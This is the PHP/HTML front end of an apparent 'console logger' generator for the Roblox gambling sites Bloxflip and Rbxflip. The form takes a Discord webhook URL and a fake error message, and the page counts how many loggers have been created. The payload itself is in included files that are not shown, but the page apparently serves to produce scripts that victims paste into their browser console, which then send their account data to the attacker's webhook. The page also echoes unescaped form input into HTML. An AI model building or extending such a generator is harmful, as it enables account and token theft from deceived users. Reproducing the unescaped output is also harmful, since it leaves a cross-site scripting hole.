<?php
require ('../../gen_files/apis/d_generate.php');
$bloxcounter = file_get_contents('counter/bloxflip_counter.txt');
$rbxcounter = file_get_contents('counter/rbxflip_counter.txt');
$domi = "$directory.php";
require ('../../blacklist/blacklisted.php');
?>

<!DOCTYPE html>
<html lang="en">
  <head>
  	<title><?=$namez?> | Console Tools</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" type="image/png" sizes="16x16" href=" <?=$thumbnailz?>">
	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://www.google.com/recaptcha/api.js" async defer></script> 	
     <script src="https://kit.fontawesome.com/da453681b7.js" crossorigin="anonymous"></script>	
	<link rel="stylesheet" type="text/css" href="../../css/util.css">
    <link rel="stylesheet" type="text/css" href="themify-icons.css">
	<link rel="stylesheet" type="text/css" href="../../css/util.css">
	<link rel="stylesheet" type="text/css" href="../../css/style.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/amplitudejs@3.2.3/dist/amplitude.min.js"></script> 
 <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">  
            </head>
</head>
<body>
<?php if (isset($error)) { ?>
    <style>.no-border {
  border: 0 !important;
    }
    
</style>  <script>
                  Swal.fire({

                 allowOutsideClick: false,
                  showConfirmButton: false,
                    showCloseButton: true,
                  icon: 'error',
                  background: '<?=$colorz?> url(https://cdn.discordapp.com/attachments/999729792037433414/1049959689867235328/imagejf.png)',
                  title: '<font color="#fff">Failed!',
                  html: '<font color="#fff"><?=$error?>'
                  })
      </script>
<?php } ?>	
<?php if (isset($success)) { ?> 
  <style>.no-border {
  border: 0 !important;
  }

</style>
      <script>
                           
        let timerInterval
Swal.fire({
                  allowOutsideClick: false,
                  showConfirmButton: false,
                  showCloseButton: true,
                  background: '<?=$colorz?> url(https://cdn.discordapp.com/attachments/999729792037433414/1049959689867235328/imagejf.png)',
                  title: '<font color="#fff">Generated Successfuly!',
                  html: 'I will close in 5 minutes.<iframe width="100%" height="200" style="border-radius:10px;" src="/js/<?php echo $domi;?>" autoplay=0" frameborder="0"></iframe><font color="#fff"><?=$success?>',
    customClass: {
    icon: 'no-border'},
  timer: 300000,
  timerProgressBar: true,
  didOpen: () => {
  
    const b = Swal.getHtmlContainer().querySelector('b')
  },
  willClose: () => {
    clearInterval(timerInterval)
  }
}).then((result) => {

  if (result.dismiss === Swal.DismissReason.timer) {
    console.log('I was closed by the timer')
  }
})
      </script>
<?php } ?>	
	<body>
<body style="background: <?=$colorz?>;background-image: url('https://cdn.discordapp.com/attachments/999729792037433414/1049959689867235328/imagejf.png'); background-repeat:repeat; background-position: center;">
	<section class="ftco-section">
		<div class="container">
			<div class="row justify-content-center">
				<div class="col-md-12 col-lg-6">
                  <style>
                    background-color: #aaa;
                  </style>
					<div class="login-wrap py-5">
		      	<h3 class="text-center mb-0"><?=$namez?></h3>
		      	<p class="text-center"><?= $sloganz; ?> </p>
						
						    		    		<div class="form-group">
		      				      			
		       
				<select onchange="lolselect(this);" name="option" id="select" class="form-control">
			
			<option style="color:black" value="BCL">Bloxflip Console Logger</option>
			<option style="color:black" value="RCL">Rbxflip Console Logger</option>
			<option style="color:black" value="LOL">Website Stats</option>
		</select>
		      		</div>
   
                <form id="input-1-profile" style="display: block;" class="login-form" method="POST">
	            <div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"><span style="font-size:15px; margin-left:10px;" class="fa-solid fa-message"></span></div>
	              <input value="<?php echo $_POST['customerrormessage'] ?? ''; ?>" type="text" name="customerrormessage"  class="form-control" placeholder="Custom Error Message" maxlength="50">
	            </div>
                   <div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"><span style="font-size:15px;margin-left:10px;"class="fa-brands fa-discord"></span></div>
	              <input value="<?php echo $_POST['dwebhook'] ?? ''; ?>" type="text" name="dwebhook" class="form-control" placeholder="Webhook URL">
	            </div>
	              <input id="autorefreshlol" type="checkbox" name="autorefreshlol" value="true"></input>
                  <label style="margin-left:20px;margin-top:-20px;" for="autorefreshlol"> Select for auto refresh page on code execution</label>
	            <div class="form-group d-md-flex">
							
              </div>
                  <div class="recaptcha-holder"></div> 
   <div class="form-group">
	                <button id="buttonnmb" class="btn form-control btn-primary rounded submit px-3"><i style="margin-top:2px;"class="fas fa-plus-circle"></i>&nbsp;CREATE</button></div>
	          </form>

           
                <form id="input-2-profile" style="display: none;" class="login-form" method="POST">
	            <div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"><span style="font-size:15px; margin-left:10px;" class="fa-solid fa-message"></span></div>
	              <input value="<?php echo $_POST['custerror'] ?? ''; ?>" type="text" name="custerror" class="form-control" placeholder="Custom Error Message" maxlength="50">
	            </div>
                   <div class="form-group">
	            	<div class="icon d-flex align-items-center justify-content-center"><span style="font-size:15px;margin-left:10px;"class="fa-brands fa-discord"></span></div>
	              <input value="<?php echo $_POST['webbhook'] ?? ''; ?>" type="text" name="webbhook" class="form-control" placeholder="Webhook URL">
	            </div>
                  <input id="autorefresh" type="checkbox" name="autorefresh" value="true"></input>
                  <label style="margin-left:20px;margin-top:-20px;" for="autorefresh"> Select for auto refresh page on code execution</label>

	            <div class="form-group d-md-flex">

              </div>
                  <div class="recaptcha-holder"></div> 
   <div class="form-group">
	                <button id="lolzio" class="btn form-control btn-primary rounded submit px-3"><i style="margin-top:2px;"class="fas fa-plus-circle"></i>&nbsp;CREATE</button></div>
	          </form>



                                
         <div id="input-4-profile" style="display: none;">
             
                <form>
	            <div class="form-group">
                <label for="lolname"><div class="w-100 mt-4 text">	          	<p class="mb-0">Creates With BLOXFLIP:</p></div></label>
	            	<div class="icon d-flex align-items-center justify-content-center"><span style="font-size:15px; margin-left:10px;margin-top:66px;" class="fa-solid fa-calculator"></span></div>
	              <input onkeydown="return false;" id="lolname" name="lolname" type="text" class="form-control" value="<?=$bloxcounter?>" required>
	            </div>
                  
                   <div class="form-group">
	            	<label for="fname"><div class="w-100 mt-4 text">	          	<p class="mb-0">Creates With RBXFLIP:</p></div></label>
                     <input onkeydown="return false;" class="form-control" type="text" id="fname" name="fname" value="<?=$rbxcounter?>">
<div class="icon d-flex align-items-center justify-content-center"><span style="font-size:15px; margin-left:10px;margin-top:66px;" class="fa-solid fa-calculator"></span></div></div></div></form>

           
          <!-- <div class="w-100 text-center mt-4 text">	          	<p class="mb-0">Have you joined our discord server?</p>
		          <a style="color:#b689b0; cursor:pointer;" onclick="location.replace('<?=$url?>')" >Join Here</a>	   
              </div>-->
            </div>
	        </div>
				</div>
			</div>
		</div>
	</div>
</section>
<script src='../../assets/generator/js/dual_generate.js'></script>
<script src="https://www.google.com/recaptcha/api.js?onload=renderGoogleInvisibleRecaptcha&render=explicit" async defer></script>
</body>
</html>